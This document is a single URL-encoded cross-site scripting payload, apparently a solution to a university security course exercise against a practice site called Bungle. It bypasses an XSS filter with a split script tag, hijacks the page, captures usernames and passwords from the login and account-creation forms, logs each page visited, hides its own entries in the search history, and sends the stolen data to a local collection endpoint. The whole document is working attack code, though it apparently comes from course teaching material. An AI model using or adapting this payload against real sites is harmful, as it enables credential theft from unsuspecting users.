http://bungle-cs461.csl.illinois.edu/./search?xssdefense=1&q=%3Cscrscriptipt%3Efunction%20payload(attacker)%20%7B%0Avar%20currentTitle%3B%0Avar%20currentPage%3B%0Avar%20currentUser%20%3D%20%22%22%3B%0Afunction%20log(data)%20%7B%0Aconsole.log(%24.param(data))%3B%0A%24.get(attacker%2C%20data)%3B%0A%7D%0Afunction%20updateCurrentPage(newHtml%2C%20newTitle%2C%20newPage)%20%7B%0A%24(%22body%22).html(newHtml)%3B%0AcurrentTitle%20%3D%20newTitle%3B%0AcurrentPage%20%3D%20newPage%3B%0Avar%20stateDict%20%3D%20%7B%0A%22html%22%3A%20%24(%22body%22).html()%2C%0A%22title%22%3A%20currentTitle%2C%0A%22page%22%3A%20currentPage%0A%7D%3B%0Awindow.history.replaceState(stateDict%2C%20currentTitle%2C%20currentPage)%3B%0A%24(%22title%22)%5B0%5D.text%20%3D%20currentTitle%3B%0AinjectIntoPage()%3B%0AlogPage()%3B%0A%7D%0Afunction%20updateHistory()%20%7B%0Avar%20stateDict%20%3D%20%7B%0A%22html%22%3A%20%24(%22body%22).html()%2C%0A%22title%22%3A%20currentTitle%2C%0A%22page%22%3A%20currentPage%0A%7D%0Awindow.history.pushState(stateDict%2C%20currentTitle%2C%20currentPage)%3B%0A%7D%0Afunction%20injectIntoPage()%20%7B%0A%2F**%20login%20form%20**%2F%0Avar%20loginButton%20%3D%20%24(%22%23log-in-btn%22)%3B%0Avar%20createAccountButton%20%3D%20%24(%22%23new-account-btn%22)%3B%0Avar%20usernameField%20%3D%20%24(%22%23username%22)%5B0%5D%3B%0Avar%20userpassField%20%3D%20%24(%22%23userpass%22)%5B0%5D%3B%0A%24(%22.form-inline%22).attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%2F*%20login%20button%20*%2F%0Aif%20(loginButton)%20%7B%0AloginButton.click(function()%20%7B%0Aif%20(usernameField.value%20%26%26%20usernameField.value)%20%7B%0Aconsole.log(%22attempt%20login%22)%3B%0A%24.post(%0A%22.%2Flogin%22%2C%0A%7B%0Ausername%3A%20usernameField.value%2C%0Apassword%3A%20userpassField.value%0A%7D%0A)%0A.done(function(data)%20%7B%0AcurrentUser%20%3D%20usernameField.value%0Alog(%7Bevent%3A%20%22login%22%2C%20user%3A%20currentUser%2C%20pass%3A%20userpassField.value%7D)%3B%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0Areturn%20false%3B%0A%7D)%0A.fail(function%20(jqXHR%2C%20textStatus%2C%20error)%20%7B%0AupdateHistory()%3B%0AtextStatus%20%3D%20textStatus.charAt(0).toUpperCase()%20%2B%20textStatus.slice(1)%0Avar%20newTitle%20%3D%20textStatus%20%2B%20%22%3A%20%22%20%2B%20jqXHR.status%20%2B%20%22%20%22%20%2B%20error%3B%0AupdateCurrentPage(jqXHR.responseText%2C%20newTitle%2C%20%22.%2Flogin%22)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D%0A%7D)%3B%0A%7D%0A%2F*%20create%20account%20button%20*%2F%0Aif%20(createAccountButton)%20%7B%0AcreateAccountButton.click(function()%20%7B%0Aif%20(usernameField.value%20%26%26%20usernameField.value)%20%7B%0Aconsole.log(%22create%20login%22)%3B%0A%24.post(%0A%22.%2Fcreate%22%2C%0A%7B%0Ausername%3A%20usernameField.value%2C%0Apassword%3A%20userpassField.value%0A%7D%0A)%0A.done(function(data)%20%7B%0AcurrentUser%20%3D%20usernameField.value%0Alog(%7Bevent%3A%20%22login%22%2C%20user%3A%20currentUser%2C%20pass%3A%20userpassField.value%7D)%3B%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0Areturn%20false%3B%0A%7D)%0A.fail(function%20(jqXHR%2C%20textStatus%2C%20error)%20%7B%0AupdateHistory()%3B%0AtextStatus%20%3D%20textStatus.charAt(0).toUpperCase()%20%2B%20textStatus.slice(1)%0Avar%20newTitle%20%3D%20textStatus%20%2B%20%22%3A%20%22%20%2B%20jqXHR.status%20%2B%20%22%20%22%20%2B%20error%3B%0AupdateCurrentPage(jqXHR.responseText%2C%20newTitle%2C%20%22.%2Fcreate%22)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D%0A%7D)%3B%0A%7D%0A%2F*%20logout%20button%20*%2F%0Avar%20logoutButton%20%3D%20%24(%22%23log-out-btn%22)%3B%0Aif%20(logoutButton)%20%7B%0AlogoutButton.click(function()%20%7B%0A%24.post(%22.%2Flogout%22)%0A.done(function(data)%20%7B%0Alog(%7Bevent%3A%20%22logout%22%2C%20user%3A%20currentUser%7D)%3B%0AcurrentUser%20%3D%20%22%22%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0Areturn%20false%3B%0A%7D)%0A.fail(function%20(jqXHR%2C%20textStatus%2C%20error)%20%7B%0AupdateHistory()%3B%0Avar%20newTitle%20%3D%20textStatus%20%2B%20%22%3A%20%22%20%2B%20jqXHR.status%20%2B%20%22%20%22%20%2B%20error%3B%0AupdateCurrentPage(jqXHR.responseText%2C%20newTitle%2C%20%22.%2Flogout%22)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D)%3B%0AlogoutButton.attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%7D%0A%2F*%20bungle%20button%20*%2F%0Avar%20bungleLink%20%3D%20%24(%22%23bungle-lnk%22)%3B%0Aif%20(bungleLink)%20%7B%0AbungleLink.removeAttr(%22href%22)%3B%0AbungleLink.click(function()%20%7B%0A%24.get(%22.%2F%22)%0A.done(function(data)%20%7B%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D)%3B%0A%7D%0A%2F*%20search%20button%20*%2F%0Avar%20searchButton%20%3D%20%24(%22%23search-btn%22)%3B%0Avar%20queryField%20%3D%20%24(%22%23query%22)%5B0%5D%3B%0Aif%20(searchButton)%20%7B%0AsearchButton.click(function()%20%7B%0Avar%20urlS%20%3D%20%22.%2Fsearch%3Fq%3D%22%20%2B%20queryField.value%3B%0A%24.get(urlS)%0A.done(function(data)%20%7B%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Search%20Results%22%2C%20urlS)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D)%3B%0AsearchButton.attr(%22onsubmit%22%2C%20%22return%20false%22)%3B%0A%7D%0A%2F*%20search%20again%20button%20*%2F%0Avar%20searchAgainButton%20%3D%20%24(%22%23search-again-btn%22)%3B%0Aif%20(searchAgainButton)%20%7B%0AsearchAgainButton.removeAttr(%22href%22)%3B%0AsearchAgainButton.click(function()%20%7B%0A%24.get(%22.%2F%22)%0A.done(function(data)%20%7B%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D)%3B%0A%7D%0A%2F*%20search%20history%20*%2F%0A%24(%22.history-item%22).removeAttr(%22href%22)%3B%0A%24.each(%24(%22.history-item%22)%2C%20function()%20%7B%0A%24(this).click(function()%20%7B%0Avar%20urlS%20%3D%20%22.%2Fsearch%3Fq%3D%22%20%2B%20this.text%3B%0A%24.get(urlS)%0A.done(function(data)%20%7B%0AupdateHistory()%3B%0AupdateCurrentPage(data%2C%20%22Search%20Results%22%2C%20urlS)%3B%0Areturn%20false%3B%0A%7D)%3B%0A%7D)%3B%0Aconsole.log(this.text)%3B%0Aif%20(this.text.includes(%22payload(attacker)%22)%20%7C%7C%20this.text.includes(%22fromCharCode(102%22))%20%7B%0Athis.remove()%3B%0A%7D%0A%7D)%3B%0A%7D%0Afunction%20logPage()%20%7B%0Avar%20path%20%3D%20window.location.href%3B%0Alog(%7Bevent%3A%20%22nav%22%2C%20user%3A%20currentUser%2C%20url%3A%20path%7D)%3B%0A%7D%0Afunction%20proxy(href)%20%7B%0A%24(%22body%22).load(href%2C%20function()%20%7B%0AupdateCurrentPage(%24(%22body%22).html()%2C%20%22Bungle!%22%2C%20%22.%2F%22)%3B%0Awindow.onpopstate%20%3D%20function(event)%20%7B%0Avar%20html%20%3D%20event.state%5B%22html%22%5D%3B%0Avar%20title%20%3D%20event.state%5B%22title%22%5D%3B%0Avar%20page%20%3D%20event.state%5B%22page%22%5D%3B%0AupdateCurrentPage(html%2C%20title%2C%20page)%3B%0A%7D%3B%0A%7D)%3B%0A%7D%0A%24(%22body%22).empty()%3B%0Aproxy(%22.%2F%22)%3B%0A%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscrscriptipt%3E
